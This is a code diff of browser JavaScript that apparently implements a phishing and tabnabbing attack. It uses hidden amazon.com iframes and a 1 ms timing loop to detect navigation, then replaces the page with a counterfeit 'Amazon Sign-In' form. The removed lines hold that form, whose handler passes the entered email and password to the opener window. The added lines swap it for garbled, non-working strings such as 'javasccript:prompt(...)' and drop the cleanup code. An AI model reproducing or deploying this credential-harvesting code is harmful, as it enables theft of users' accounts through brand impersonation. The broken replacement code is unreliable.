@@ -7,22 +7,10 @@
   var w;
   var t;
   var z;
-  var frames = [];   // simpan iframe slow() agar bisa dibersihkan
-  var guard;         // watchdog: pastikan timer & iframe berhenti
-
-  //hapus iframe slow() + hentikan interval (bebaskan resource -> form tidak freeze)
-  function cleanup(){
-  clearInterval(z);
-  for (var i=0; i<frames.length; i++){
-  if(frames[i] && frames[i].parentNode){ frames[i].parentNode.removeChild(frames[i]); }
-  }
-  frames = [];
-  }
   
   if(location.href.indexOf("fake") !== -1){
-  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  document.body.innerHTML = "javasccript:prompt('Enter your email and password');";
   }
-  
   
   function foo(){
   
@@ -38,7 +26,9 @@
   
   if(w.location.href !== 'about:blank'){
   
-  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  alert("Redirecting");
+  
+  document.body.innerHTML = "javascript:prompt('Enter your email and password');";
   
   slow();
   
@@ -47,13 +37,9 @@
   clearInterval(t);
   
   z = setInterval('baz()',1);
-
-  //watchdog: kalau exception cross-origin tak pernah terlempar,
-  //tetap hentikan interval 1ms & buang iframe agar form tidak beku selamanya
-  guard = setTimeout(cleanup, 1500);
-
+  
   }
-
+  
   }
   
   function baz(){
@@ -64,11 +50,10 @@
   
   //stop page loading
   w.location.href='https://www.google.com/csi';
-  clearTimeout(guard);
-  cleanup();   //hentikan interval + buang 10 iframe amazon (penyebab freeze)
+  clearInterval(z);
   
   //Make sure the old content is not cleared
-  setTimeout("window.location.href='about:blank';window.close();", 3000);
+  setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
   }
   
   }
@@ -82,8 +67,7 @@
   iframe.src = 'https://www.amazon.com/';
   iframe.style = 'display:none';
   document.body.appendChild(iframe);
-  frames.push(iframe);   //catat agar bisa dibuang saat cleanup()
-
+  
   }
   }
   
